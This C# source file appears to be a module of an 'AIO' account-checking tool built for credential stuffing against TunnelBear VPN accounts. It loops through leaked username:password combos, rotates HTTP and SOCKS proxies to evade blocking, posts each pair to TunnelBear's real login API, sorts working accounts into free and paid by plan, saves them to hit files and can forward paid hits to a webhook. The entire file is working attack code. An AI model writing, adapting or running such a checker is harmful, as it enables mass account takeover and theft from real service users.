using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class Tunnelbearmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                            var strResponse = req.Post(new Uri("https://api.tunnelbear.com/core/web/api/login"),
                                    new BytesContent(Encoding.Default.GetBytes(
                                        $"username={array[0]}&password={array[1]}&withUserDetails=true&v=web-1.0")))
                                .ToString();

                            if (strResponse.Contains("result\":\"PASS"))
                            {
                                var jsonObj = (JObject) JsonConvert.DeserializeObject(strResponse);

                                var plan = jsonObj["details"]["paymentStatus"].ToString();
                                if (plan == "FREE")
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Tunnelbear", array[0] + ":" + array[1]);
                                    Export.AsResult("/Tunnelbear_frees", array[0] + ":" + array[1]);
                                }
                                else
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Tunnelbear_hits", array[0] + ":" + array[1] + " | Plan: " + plan);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Tunnelbear", array[0] + ":" + array[1] + " | Plan: " + plan);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Plan: " + plan,
                                            "Tunnelbear Hits");
                                }
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}